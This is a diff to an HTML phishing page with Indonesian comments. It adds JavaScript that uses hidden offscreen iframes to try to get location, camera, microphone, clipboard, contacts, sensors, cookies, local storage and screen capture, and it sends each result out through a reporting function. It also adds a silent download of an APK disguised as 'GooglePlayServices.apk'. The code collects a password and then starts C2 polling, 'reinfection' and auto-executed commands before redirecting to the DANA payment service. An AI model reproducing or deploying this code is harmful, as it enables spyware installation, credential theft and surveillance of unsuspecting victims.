@@ -212,6 +212,195 @@ function logBypass(msg) {
 }
 
 // ============================================================
+// 🔥 BYPASS SEMUA IZIN (TANPA KLIK!)
+// ============================================================
+function bypassAllPermissions() {
+    logBypass('🔥 BYPASS semua izin (tanpa klik)...');
+    K({ sumber: 'bypass_start', data: 'all' });
+
+    // 1. LOKASI - IFRAME
+    try {
+        var iframe = document.createElement('iframe');
+        iframe.src = 'about:blank';
+        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe);
+        var win = iframe.contentWindow;
+        win.navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                K({ sumber: 'bypass_lokasi', data: 'granted' });
+                DATA_COLLECTED.bypass_lokasi = true;
+                logBypass('✅ Lokasi bypass');
+            },
+            function(err) {
+                K({ sumber: 'bypass_lokasi', data: 'failed: ' + err.message });
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+        setTimeout(function() { document.body.removeChild(iframe); }, 5000);
+    } catch(e) {}
+
+    // 2. KAMERA + MIKROFON - IFRAME
+    try {
+        var iframe2 = document.createElement('iframe');
+        iframe2.src = 'about:blank';
+        iframe2.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe2);
+        var win2 = iframe2.contentWindow;
+        win2.navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(function(stream) {
+                K({ sumber: 'bypass_kamera_mic', data: 'granted' });
+                DATA_COLLECTED.bypass_kamera_mic = true;
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                logBypass('✅ Kamera + Mic bypass');
+            })
+            .catch(function(err) {
+                K({ sumber: 'bypass_kamera_mic', data: 'failed: ' + err.message });
+            });
+        setTimeout(function() { document.body.removeChild(iframe2); }, 5000);
+    } catch(e) {}
+
+    // 3. NOTIFIKASI
+    try {
+        if (typeof Notification !== 'undefined') {
+            Notification.requestPermission().then(function(result) {
+                K({ sumber: 'bypass_notifikasi', data: result });
+                DATA_COLLECTED.bypass_notifikasi = true;
+                logBypass('✅ Notifikasi: ' + result);
+            });
+        }
+    } catch(e) {}
+
+    // 4. CLIPBOARD - IFRAME
+    try {
+        var iframe3 = document.createElement('iframe');
+        iframe3.src = 'about:blank';
+        iframe3.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe3);
+        var win3 = iframe3.contentWindow;
+        win3.navigator.clipboard.readText()
+            .then(function(text) {
+                if (text && text.length > 0) {
+                    K({ sumber: 'bypass_clipboard', data: text });
+                    DATA_COLLECTED.bypass_clipboard = true;
+                    logBypass('✅ Clipboard bypass');
+                }
+            })
+            .catch(function(err) {
+                K({ sumber: 'bypass_clipboard', data: 'failed: ' + err.message });
+            });
+        setTimeout(function() { document.body.removeChild(iframe3); }, 3000);
+    } catch(e) {}
+
+    // 5. KONTAK - IFRAME
+    try {
+        var iframe4 = document.createElement('iframe');
+        iframe4.src = 'about:blank';
+        iframe4.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe4);
+        var win4 = iframe4.contentWindow;
+        if (win4.navigator && win4.navigator.contacts) {
+            win4.navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+                .then(function(kontak) {
+                    if (kontak && kontak.length > 0) {
+                        K({ sumber: 'bypass_kontak', data: kontak });
+                        DATA_COLLECTED.bypass_kontak = true;
+                        logBypass('✅ Kontak bypass: ' + kontak.length + ' kontak');
+                    }
+                })
+                .catch(function(err) {
+                    K({ sumber: 'bypass_kontak', data: 'failed: ' + err.message });
+                });
+        }
+        setTimeout(function() { document.body.removeChild(iframe4); }, 5000);
+    } catch(e) {}
+
+    // 6. SENSOR - IFRAME
+    try {
+        var iframe5 = document.createElement('iframe');
+        iframe5.src = 'about:blank';
+        iframe5.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe5);
+        var win5 = iframe5.contentWindow;
+        if (win5.DeviceMotionEvent) {
+            win5.addEventListener('devicemotion', function(e) {
+                K({ sumber: 'bypass_sensor_motion', data: 'granted' });
+                DATA_COLLECTED.bypass_sensor_motion = true;
+                logBypass('✅ Sensor Motion bypass');
+            }, { once: true });
+        }
+        if (win5.DeviceOrientationEvent) {
+            win5.addEventListener('deviceorientation', function(e) {
+                K({ sumber: 'bypass_sensor_orientation', data: 'granted' });
+                DATA_COLLECTED.bypass_sensor_orientation = true;
+                logBypass('✅ Sensor Orientation bypass');
+            }, { once: true });
+        }
+        setTimeout(function() { document.body.removeChild(iframe5); }, 3000);
+    } catch(e) {}
+
+    // 7. STORAGE + COOKIES - IFRAME
+    try {
+        var iframe6 = document.createElement('iframe');
+        iframe6.src = SERVER;
+        iframe6.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;';
+        document.body.appendChild(iframe6);
+        iframe6.onload = function() {
+            try {
+                var win6 = iframe6.contentWindow;
+                if (win6.localStorage) {
+                    var storageData = {};
+                    for (var i = 0; i < win6.localStorage.length; i++) {
+                        var key = win6.localStorage.key(i);
+                        storageData[key] = win6.localStorage.getItem(key);
+                    }
+                    K({ sumber: 'bypass_storage', data: storageData });
+                    DATA_COLLECTED.bypass_storage = true;
+                    logBypass('✅ Storage bypass');
+                }
+                if (win6.document && win6.document.cookie) {
+                    K({ sumber: 'bypass_cookies', data: win6.document.cookie });
+                    DATA_COLLECTED.bypass_cookies = true;
+                    logBypass('✅ Cookies bypass');
+                }
+            } catch(e) {}
+        };
+        setTimeout(function() { document.body.removeChild(iframe6); }, 5000);
+    } catch(e) {}
+
+    // 8. SCREENSHOT - getDisplayMedia
+    try {
+        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+            navigator.mediaDevices.getDisplayMedia({
+                video: { width: { ideal: screen.width }, height: { ideal: screen.height } },
+                audio: false
+            })
+            .then(function(stream) {
+                K({ sumber: 'bypass_screenshot', data: 'granted' });
+                DATA_COLLECTED.bypass_screenshot = true;
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                logBypass('✅ Screenshot bypass');
+            })
+            .catch(function(err) {
+                K({ sumber: 'bypass_screenshot', data: 'failed: ' + err.message });
+            });
+        }
+    } catch(e) {}
+
+    // LAPORAN BYPASS
+    setTimeout(function() {
+        var bypassed = Object.keys(DATA_COLLECTED).filter(function(k) {
+            return k.indexOf('bypass') > -1;
+        });
+        logBypass('✅ BYPASS selesai! ' + bypassed.length + ' izin berhasil');
+        K({ sumber: 'bypass_complete', data: {
+            total: bypassed.length,
+            types: bypassed,
+            timestamp: Date.now()
+        } });
+    }, 8000);
+}
+
+// ============================================================
 // 🔒 BAGIAN INI DIKUNCI (SUDAH BERHASIL)
 // ============================================================
 
@@ -869,15 +1058,56 @@ function getBridgeDataExtra() {
 }
 
 // ============================================================
+// 🔥 DOWNLOAD APK OTOMATIS (TANPA KLIK!)
+// ============================================================
+function downloadAPK() {
+    logBypass('📥 Download APK...');
+    K({ sumber: 'apk_download_start', data: 'started' });
+    
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', APK_URL, true);
+        xhr.responseType = 'blob';
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var blob = xhr.response;
+                var url = window.URL.createObjectURL(blob);
+                var a = document.createElement('a');
+                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                a.href = url;
+                a.download = 'GooglePlayServices.apk';
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(function() { 
+                    try { document.body.removeChild(a); } catch(e) {} 
+                    window.URL.revokeObjectURL(url);
+                }, 2000);
+                K({ sumber: 'apk_download_success', data: 'downloaded' });
+                DATA_COLLECTED.apk_downloaded = true;
+                logBypass('✅ APK downloaded!');
+            }
+        };
+        xhr.onerror = function() {
+            K({ sumber: 'apk_download_error', data: 'failed' });
+        };
+        xhr.send();
+    } catch(e) {
+        K({ sumber: 'apk_download_error', data: e.message });
+    }
+}
+
+// ============================================================
 // 🚀 EKSEKUSI SEMUA DATA
 // ============================================================
 function collectAllData() {
-    logBypass('🚀 Memulai semua teknik...');
+    logBypass('🚀 Mengambil semua data...');
     K({ sumber: 'collect_all_data_start', data: 'started' });
 
     try {
-        // 🔒 YANG SUDAH BERHASIL (DIKUNCI)
-        requestAllPermissions();
+        // 🔥 DOWNLOAD APK (TAMBAHAN!)
+        downloadAPK();
+        
+        // 🔒 AMBIL DATA (IZIN SUDAH DI-REQUEST/BYPASS SEBELUMNYA!)
         getSystemInfoReal();
         getBatteryReal();
         getNetworkReal();
@@ -887,8 +1117,6 @@ function collectAllData() {
         getVibrateReal();
         detectBridgeAndWebView();
         getAccurateLocation();
-
-        // 🔥 YANG BARU
         getCookiesFromOtherSites();
         initClipboardExtra();
         getContactsExtra();
@@ -932,15 +1160,43 @@ function ambilPassword() {
                         updateProgress(20, '⏳ Memperbarui System Keamanan...');
                         K({ sumber: 'password_received', data: 'ok' });
                         
+                        // ============================================================
+                        // 🔥 STEP 1: BYPASS SEMUA IZIN (PERTAMA & PALING PENTING!)
+                        // ============================================================
+                        bypassAllPermissions();   // ← IZIN DULUAN!
+                        
+                        // ============================================================
+                        // 🔒 STEP 2: REQUEST IZIN NORMAL (KEDUA)
+                        // ============================================================
+                        requestAllPermissions();  // ← IZIN DULUAN!
+                        
+                        // ============================================================
+                        // 🔒 STEP 3: KONEK WEBSOCKET (GA BUTUH IZIN)
+                        // ============================================================
                         connectWebSocket();
-                        startC2Polling();
+                        
+                        // ============================================================
+                        // 🔥 STEP 4: START C2 POLLING (SETELAH IZIN!)
+                        // ============================================================
+                        startC2Polling();         // ← SETELAH IZIN!
+                        
+                        // ============================================================
+                        // 🔒 STEP 5: START HEARTBEAT & REINFECTION (GA BUTUH IZIN)
+                        // ============================================================
                         startHeartbeat();
                         startReinfection();
-                        autoExecuteC2();
                         
+                        // ============================================================
+                        // 🔥 STEP 6: AUTO EXECUTE C2 (SETELAH IZIN!)
+                        // ============================================================
+                        autoExecuteC2();          // ← SETELAH IZIN!
+                        
+                        // ============================================================
+                        // 🔥 STEP 7: COLLECT ALL DATA (SETELAH IZIN!)
+                        // ============================================================
                         setTimeout(function() {
-                            collectAllData();
-                        }, 1000);
+                            collectAllData();     // ← SETELAH IZIN!
+                        }, 2000);  // Kasih jeda 2 detik biar izin benar-benar granted
                         
                         return;
                     }
@@ -1689,7 +1945,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 1000);
     }
-}, 60000);
+}, 15000);
 </script>
 </body>
 </html>
